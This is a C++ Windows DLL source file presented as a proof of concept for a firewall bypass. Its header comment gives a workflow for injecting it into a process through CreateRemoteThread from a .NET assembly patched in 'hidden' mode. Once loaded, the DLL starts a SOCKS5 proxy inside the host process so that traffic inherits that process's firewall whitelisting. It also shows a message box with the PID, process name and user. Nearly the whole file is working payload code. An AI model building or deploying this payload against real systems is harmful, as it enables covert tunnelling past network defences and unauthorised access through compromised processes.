/* 

    Author          : Gregory King
    Date            : 07/17/25
    Description     : The purpose of this dll is to be injected to a thread by another application (NetPatcher patched .net assembly) using CreateRemoteThread 
                      the program should do the following: create a local socks5 proxy to allow a local or remote application to connect to a remote location (as the context of the thread)
                      the proxy should listen on a local port and forward all traffic to the remote location. The program should also display a MessageBox saying "Thread Injection Success" 
                      and display the environment info (such as the pid of the process, the process name, and the user or other information regarding the context the thread was executed in.
                      All this DLL does is start a socks server and display a messagebox.
	
    Note            : This is a POC of a Firewall Bypass using Thread Injection and a local SOCKS5 proxy, to be used in conjunction with a patched .NET assembly that uses 
                      CreateRemoteThread to inject this DLL into a target process.

                      Workflow: 
						1) Compile this code as a DLL and place it in the same directory as NetPatcher.exe
                        2) Patch a .net assembly with NetPatcher. Select option 4 (hidden)
                        3) Select InjectedThreadPayload.dll as the DLL to inject
						4) Run the patched .net assembly, it will create a thread that injects this DLL
                        5) The DLL will execute in the context of the process injected (if it has firewall whitelisting, the socks5 proxy will be able to connect
                           to a remote location)
                        6) For Debug purposes, the DLL will display a MessageBox with the process ID, process name, and user name.

*/

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <thread>
#include <sstream>

#pragma comment(lib, "Ws2_32.lib")

#define SOCKS5_PORT 1080 /* local port to listen on */

/* helper: initialize winsock */
bool InitWinsock() {
    WSADATA wsaData;
    return WSAStartup(MAKEWORD(2, 2), &wsaData) == 0;
}

/* helper: cleanup winsock */
void CleanupWinsock() {
    WSACleanup();
}

/* relay data between two sockets */
void Relay(SOCKET s1, SOCKET s2) {
    char buf[4096];
    int len;
    while ((len = recv(s1, buf, sizeof(buf), 0)) > 0) {
        if (send(s2, buf, len, 0) <= 0) break;
    }
    shutdown(s2, SD_BOTH);
}

/* handle a single socks5 client connection */
void HandleSocks5Client(SOCKET clientSock) {
    unsigned char buf[262];
    int recvLen = recv(clientSock, (char*)buf, sizeof(buf), 0);
    if (recvLen < 3 || buf[0] != 0x05) {
        closesocket(clientSock);
        return;
    }
    /* no authentication */
    unsigned char reply[2] = {0x05, 0x00};
    if (send(clientSock, (const char*)reply, 2, 0) != 2) {
        closesocket(clientSock);
        return;
    }

    /* request details */
    recvLen = recv(clientSock, (char*)buf, sizeof(buf), 0);
    if (recvLen < 7 || buf[0] != 0x05 || buf[1] != 0x01) { /* only connect supported */
        closesocket(clientSock);
        return;
    }

    /* parse destination address and port */
    char destIp[INET_ADDRSTRLEN] = {0};
    unsigned short destPort = 0;
    if (buf[3] == 0x01) { /* ipv4 */
        inet_ntop(AF_INET, buf + 4, destIp, sizeof(destIp));
        destPort = (buf[8] << 8) | buf[9];
    } else {
        /* only ipv4 supported */
        closesocket(clientSock);
        return;
    }

    /* connect to remote destination */
    SOCKET remoteSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (remoteSock == INVALID_SOCKET) {
        closesocket(clientSock);
        return;
    }
    sockaddr_in remoteAddr = {};
    remoteAddr.sin_family = AF_INET;
    inet_pton(AF_INET, destIp, &remoteAddr.sin_addr);
    remoteAddr.sin_port = htons(destPort);

    if (connect(remoteSock, (sockaddr*)&remoteAddr, sizeof(remoteAddr)) == SOCKET_ERROR) {
        /* connection failed, send error */
        unsigned char failReply[10] = {0x05, 0x01, 0x00, 0x01};
        memset(failReply + 4, 0, 6);
        send(clientSock, (const char*)failReply, 10, 0);
        closesocket(clientSock);
        closesocket(remoteSock);
        return;
    }

    /* send success reply */
    unsigned char successReply[10] = {0x05, 0x00, 0x00, 0x01};
    memset(successReply + 4, 0, 6); /* bind address/port (zeros) */
    send(clientSock, (const char*)successReply, 10, 0);

    /* start relaying data in both directions */
    std::thread t1(Relay, clientSock, remoteSock);
    std::thread t2(Relay, remoteSock, clientSock);
    t1.join();
    t2.join();

    closesocket(clientSock);
    closesocket(remoteSock);
}

/* socks5 proxy server (multi-client) */
void RunSocks5Proxy() {
    if (!InitWinsock()) return;

    SOCKET listenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSock == INVALID_SOCKET) {
        CleanupWinsock();
        return;
    }

    sockaddr_in serverAddr = {};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = htonl(INADDR_LOOPBACK); /* listen on localhost */
    serverAddr.sin_port = htons(SOCKS5_PORT);

    if (bind(listenSock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR ||
        listen(listenSock, SOMAXCONN) == SOCKET_ERROR) {
        closesocket(listenSock);
        CleanupWinsock();
        return;
    }

    while (true) {
        SOCKET clientSock = accept(listenSock, nullptr, nullptr);
        if (clientSock == INVALID_SOCKET) break;
        std::thread(HandleSocks5Client, clientSock).detach();
    }
    closesocket(listenSock);
    CleanupWinsock();
}

/* helper: gather environment info and show messagebox */
void ShowInjectionInfo() {
    /* get pid */
    DWORD pid = GetCurrentProcessId();

    /* get process name */
    wchar_t processName[MAX_PATH] = L"";
    GetModuleFileNameW(nullptr, processName, MAX_PATH);

    /* get user name */
    wchar_t userName[256] = L"";
    DWORD userNameLen = 256;
    GetUserNameW(userName, &userNameLen);

    /* format message */
    std::wstringstream ss;
    ss << L"Thread Injection Success\n\n"
       << L"PID: " << pid << L"\n"
       << L"Process: " << processName << L"\n"
       << L"User: " << userName;

    MessageBoxW(nullptr, ss.str().c_str(), L"Injection Info", MB_OK | MB_ICONINFORMATION);
}

DWORD WINAPI WorkerThread(LPVOID lpParam) {
    /* start the socks5 proxy in a separate thread */
    std::thread(RunSocks5Proxy).detach();

    /* display injection success message with environment info immediately */
    ShowInjectionInfo();

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD  ul_reason_for_call,
                      LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        CreateThread(nullptr, 0, WorkerThread, hModule, 0, nullptr);
        break;
    case DLL_PROCESS_DETACH:
        /* cleanup if needed */
        break;
    }
    return TRUE;
}